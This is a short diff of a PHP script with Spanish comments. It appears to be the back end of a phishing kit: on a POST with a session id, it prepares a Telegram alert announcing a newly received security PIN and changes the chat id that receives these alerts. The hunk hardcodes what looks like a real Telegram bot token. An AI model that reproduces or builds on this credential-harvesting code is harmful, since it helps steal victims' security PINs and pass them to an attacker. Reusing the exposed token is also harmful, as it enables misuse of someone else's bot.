@@ -19,7 +19,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($id_sesion)) {
 
             // 2. Credenciales del bot activo
             $token = "9227967121:AAHNi3XNSyv-w_vJjP5BkAnQFZRJzoOS39I";
-            $chat_id = "8166259970";
+            $chat_id = "7984785672";
 
             // 3. Estructurar la alerta para tu Telegram
             $mensaje = "🔔 ¡NUEVO PIN DE SEGURIDAD RECIBIDO!\n\n";
